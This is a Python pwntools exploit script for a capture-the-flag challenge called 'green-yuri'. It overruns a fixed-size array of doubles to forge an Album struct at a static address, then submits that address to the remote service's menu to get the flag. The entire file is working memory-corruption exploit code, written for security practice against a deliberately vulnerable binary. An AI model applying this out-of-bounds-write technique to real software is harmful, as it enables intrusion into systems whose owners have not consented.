#!/usr/bin/env python3
from pwn import *
import struct

# Connection settings
HOST = 'blitzinstance1.ddns.net'
PORT = 33440

# Connect to remote
io = remote(HOST, PORT)

# Receive initial text
io.recvuntil(b'so: what will we do today?')

# Album structure layout:
# char album_name[16]    - "me to her\x00"
# char artist_name[16]   - "mitsuki koga\x00"
# short song_count       - 10 (0x000a)
# bool completed         - 1 (true)

# We need to construct the Album structure in memory
# We'll use the out-of-bounds write in paychecks array

# First, let's burn through iterations to get to index 128+ where we overflow
# paychecks array is at 0x80 doubles = 128 doubles

# Strategy: Write the Album structure after the paychecks array
# We need to write 34 bytes (5 doubles worth of data)

# Prepare the Album data
album_name = b"me to her\x00" + b"\x00" * 6  # 16 bytes
artist_name = b"mitsuki koga\x00" + b"\x00" * 3  # 16 bytes  
song_count = struct.pack("<H", 10)  # 2 bytes (short)
completed = b"\x01"  # 1 byte (bool true)
padding = b"\x00"  # 1 byte padding

# Combine into album structure (34 bytes total)
album_data = album_name + artist_name + song_count + completed + padding

# Convert to doubles for writing (each double is 8 bytes)
doubles = []
for i in range(0, len(album_data), 8):
    chunk = album_data[i:i+8]
    if len(chunk) < 8:
        chunk += b"\x00" * (8 - len(chunk))
    # Unpack as double
    d = struct.unpack("<d", chunk)[0]
    doubles.append(d)

log.info(f"Album structure as doubles: {doubles}")

# We need to find the address of paychecks array
# From the binary, we can calculate or leak it
# For PIE disabled binary, addresses are fixed
# Let's assume paychecks is at a known location (we need to find this)

# Since the binary is compiled with -no-pie, addresses are static
# We need to determine the address of paychecks from the binary
# For now, let's try to leak or calculate it

# Option: Use pwntools to get the address
# We'll need to analyze the binary first
context.binary = './green-yuri'
elf = ELF('./green-yuri', checksec=False)

paychecks_addr = elf.symbols['paychecks']
log.success(f"paychecks address: {hex(paychecks_addr)}")

# Calculate where our fake Album will be
# We'll write it starting at paychecks[128]
fake_album_addr = paychecks_addr + (128 * 8)
log.success(f"Fake album address: {hex(fake_album_addr)}")

# Now perform the exploit:
# 1. Choose option 2 repeatedly to increment days
# 2. When days reaches 128+, write our Album structure
# 3. Choose option 3 and provide the fake album address

def write_paycheck(value):
    io.recvuntil(b'what are we doing today? > ')
    io.sendline(b'2')
    io.recvuntil(b'how much money did you make today? > ')
    io.sendline(str(value).encode())

def send_album(addr):
    io.recvuntil(b'what are we doing today? > ')
    io.sendline(b'3')
    io.recvuntil(b"where's your album stored at? > ")
    io.sendline(hex(addr)[2:].encode())

# Write dummy values for indices 0-127
log.info("Writing dummy paychecks for indices 0-127...")
for i in range(128):
    write_paycheck(0.0)
    
# Now write our fake Album structure starting at index 128
log.info("Writing fake Album structure...")
for i, d in enumerate(doubles):
    log.info(f"Writing double {i}: {d}")
    write_paycheck(d)

# Now send option 3 with the fake album address
log.info("Sending album address...")
send_album(fake_album_addr)

# Get the flag!
io.interactive()